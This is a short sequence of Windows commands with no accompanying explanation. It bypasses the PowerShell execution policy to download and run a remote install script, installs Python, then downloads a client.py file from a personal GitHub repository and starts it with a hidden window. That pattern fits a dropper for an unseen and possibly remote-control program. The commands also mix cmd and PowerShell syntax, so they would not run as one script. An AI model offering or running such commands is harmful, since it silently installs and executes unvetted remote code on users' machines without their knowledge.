@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"

choco install -y python3

python --version

mkdir SWAMI

cd SWAMI

iwr "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py" -UseBasicParsing -OutFile client.py

Start-Process python.exe -ArgumentList "client.py" -WindowStyle Hidden 
